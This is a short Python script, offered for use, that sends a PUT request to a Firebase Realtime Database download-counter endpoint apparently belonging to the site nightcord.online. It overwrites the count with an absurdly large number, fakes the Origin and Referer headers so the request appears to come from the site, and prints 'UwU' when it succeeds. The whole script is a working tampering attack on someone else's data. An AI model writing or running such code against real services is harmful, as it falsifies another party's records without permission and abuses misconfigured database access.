import requests

URL = "https://nightcord-174e9-default-rtdb.firebaseio.com/downloads/count.json"

HEADERS = {
    "Content-Type": "application/json",
    "Origin": "https://nightcord.online",
    "Referer": "https://nightcord.online/"
}

payload = 681165155854184418745

r = requests.put(URL, json=payload, headers=HEADERS)

if r.status_code == 200:
    print("-> UwU")
else:
    print("FAILED -_- :", r.text)